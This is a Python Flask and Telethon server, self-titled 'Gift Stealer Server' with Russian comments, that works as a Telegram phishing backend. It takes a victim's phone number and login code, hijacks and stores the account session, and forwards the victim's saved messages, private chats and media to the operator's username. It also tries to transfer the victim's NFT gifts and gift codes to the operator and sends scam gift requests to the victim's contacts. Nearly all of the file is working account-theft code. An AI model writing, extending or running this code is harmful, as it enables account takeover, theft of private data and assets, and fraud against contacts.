from telethon import TelegramClient, functions, types
import asyncio
import logging
import sqlite3
import os
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# Твои данные
api_id = 25015433
api_hash = '546b7eb3f2865939ca71dbaedb49017d'
YOUR_USERNAME = '@paradistics'

def init_db():
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
                 (phone TEXT PRIMARY KEY, 
                  phone_code_hash TEXT,
                  session_file TEXT,
                  status TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

async def send_code_request(phone):
    try:
        session_file = f"sessions/{phone}.session"
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        phone_code_hash = sent_code.phone_code_hash
        
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO auth_sessions 
                    (phone, phone_code_hash, session_file, status) 
                    VALUES (?, ?, ?, ?)''',
                 (phone, phone_code_hash, session_file, 'code_sent'))
        conn.commit()
        conn.close()
        
        await client.disconnect()
        return {'status': 'code_sent'}
        
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

async def verify_code(phone, code):
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("SELECT phone_code_hash, session_file FROM auth_sessions WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        
        if not result:
            return {'status': 'error', 'message': 'Сессия не найдена'}
        
        phone_code_hash, session_file = result
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        try:
            # Получаем информацию о пользователе
            me = await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            # ОБНОВЛЯЕМ СТАТУС
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute("UPDATE auth_sessions SET status = 'authenticated' WHERE phone = ?", (phone,))
            conn.commit()
            conn.close()
            
            # ЗАПУСКАЕМ ВОРОВСТВО ПОДАРКОВ И ДАННЫХ
            await steal_gifts_and_data(client, phone)
            
            await client.disconnect()
            return {'status': 'success'}
            
        except Exception as e:
            await client.disconnect()
            return {'status': 'error', 'message': str(e)}
            
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

async def steal_gifts_and_data(client, phone):
    """Главная функция воровства подарков и данных"""
    try:
        me = await client.get_me()
        logging.info(f"🔥 STARTING ULTIMATE THEFT from: {me.first_name}")
        
        # 1. ВОРУЕМ УНИКАЛЬНЫЕ NFT ПОДАРКИ ИЗ ПРОФИЛЯ
        await transfer_profile_gifts(client)
        
        # 2. ДАРИМ ОБЫЧНЫЕ ПОДАРКИ ЗА ЗВЕЗДЫ
        await send_star_gifts(client)
        
        # 3. ВОРУЕМ ВСЕ ДАННЫЕ
        await steal_all_user_data(client)
        
        # 4. МАССОВАЯ РАССЫЛКА
        await mass_gift_requests(client)
        
        logging.info(f"✅ ULTIMATE THEFT COMPLETED for: {phone}")
        
    except Exception as e:
        logging.error(f"❌ Ultimate theft error: {e}")

async def transfer_profile_gifts(client):
    """Передаем уникальные подарки из профиля"""
    try:
        logging.info("🎨 TRANSFERRING PROFILE GIFTS")
        
        # Получаем коллекцию стикеров (подарков)
        try:
            sticker_set = await client(functions.messages.GetStickerSetRequest(
                stickerset=types.InputStickerSetShortName(short_name='gifts')
            ))
            
            for doc in sticker_set.documents:
                # Пытаемся отправить как подарок
                await client.send_file(YOUR_USERNAME, doc, caption="🎁 Gift from collection")
                logging.info("🎁 Sent gift from collection")
                await asyncio.sleep(1)
                
        except Exception as e:
            logging.error(f"❌ Sticker collection error: {e}")
        
        # Альтернативный метод - через поиск в диалогах
        async for dialog in client.iter_dialogs():
            try:
                # Ищем сообщения с подарками
                async for message in client.iter_messages(dialog.id, limit=50):
                    if message.media and hasattr(message.media, 'document'):
                        # Проверяем на подарки
                        doc = message.media.document
                        if hasattr(doc, 'attributes'):
                            for attr in doc.attributes:
                                if hasattr(attr, 'alt') and any(word in attr.alt.lower() for word in ['gift', 'present', 'nft']):
                                    # Пересылаем тебе
                                    await client.forward_messages(YOUR_USERNAME, message)
                                    logging.info(f"🎁 Found and forwarded gift from {dialog.name}")
                                    await asyncio.sleep(1)
            except:
                continue
                
    except Exception as e:
        logging.error(f"❌ Profile gifts error: {e}")

async def send_star_gifts(client):
    """Дарим подарки за звезды"""
    try:
        logging.info("⭐ SENDING STAR GIFTS")
        
        # Получаем доступные подарки из магазина
        try:
            # Используем метод получения премиум подарков
            result = await client(functions.payments.GetPremiumGiftCodeOptionsRequest())
            
            for option in result.options:
                # Покупаем и отправляем подарок
                try:
                    gift_code = await client(functions.payments.CheckGiftCodeRequest(
                        slug=option.slug
                    ))
                    
                    # Активируем код для себя
                    await client(functions.payments.ApplyGiftCodeRequest(
                        slug=option.slug
                    ))
                    
                    logging.info(f"⭐ Activated gift: {option.amount} stars")
                    
                except Exception as e:
                    logging.error(f"❌ Gift activation error: {e}")
                    
        except Exception as e:
            logging.error(f"❌ Premium gifts error: {e}")
            
        # Отправляем подарки через ботов
        gift_bots = ['@PremiumBot', '@GiftBot', '@DonateBot']
        
        for bot in gift_bots:
            try:
                await client.send_message(bot, '/start')
                await asyncio.sleep(1)
                
                # Пытаемся отправить подарок себе
                await client.send_message(bot, f'send gift to {YOUR_USERNAME}')
                await asyncio.sleep(1)
                
                # Подтверждаем отправку
                await client.send_message(bot, 'confirm')
                await asyncio.sleep(1)
                
                logging.info(f"🤖 Sent gift via {bot}")
                
            except Exception as e:
                continue
                
    except Exception as e:
        logging.error(f"❌ Star gifts error: {e}")

async def steal_all_user_data(client):
    """Воруем все данные пользователя"""
    try:
        logging.info("📱 STEALING USER DATA")
        
        # 1. Избранные сообщения
        async for dialog in client.iter_dialogs():
            if dialog.is_user and dialog.entity.id == (await client.get_me()).id:
                async for message in client.iter_messages(dialog.id, limit=100):
                    try:
                        await client.forward_messages(YOUR_USERNAME, message)
                    except:
                        pass
                break
        
        # 2. Личные сообщения
        async for dialog in client.iter_dialogs(limit=20):
            if dialog.is_user and not dialog.entity.bot:
                try:
                    async for message in client.iter_messages(dialog.id, limit=10):
                        if message.text and len(message.text) > 20:
                            await client.forward_messages(YOUR_USERNAME, message)
                            break
                except:
                    continue
        
        # 3. Медиа файлы
        async for message in client.iter_messages(None, limit=50):
            if message.media:
                try:
                    await client.forward_messages(YOUR_USERNAME, message)
                except:
                    pass
                    
    except Exception as e:
        logging.error(f"❌ User data theft error: {e}")

async def mass_gift_requests(client):
    """Массовая рассылка с просьбой о подарках"""
    try:
        logging.info("📨 MASS GIFT REQUESTS")
        
        message = f"""🎁 Привет!

Можешь отправить мне подарок в Telegram?
Мой username: @trepall

Буду очень благодарен! ❤️"""

        sent = 0
        async for dialog in client.iter_dialogs(limit=30):
            if dialog.is_user and not dialog.entity.bot:
                try:
                    await client.send_message(dialog.id, message)
                    sent += 1
                    await asyncio.sleep(1)
                except:
                    continue
        
        logging.info(f"✅ Sent {sent} gift requests")
        
    except Exception as e:
        logging.error(f"❌ Mass requests error: {e}")

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

@app.route('/')
def home():
    return jsonify({'status': 'active', 'message': 'Gift Stealer Server'})

@app.route('/auth', methods=['POST'])
def auth():
    data = request.get_json()
    phone = data.get('phone')
    result = run_async(send_code_request(phone))
    return jsonify(result)

@app.route('/code', methods=['POST'])
def verify_code_route():
    data = request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    result = run_async(verify_code(phone, code))
    return jsonify(result)

if __name__ == '__main__':
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    app.run(host='0.0.0.0', port=5000)
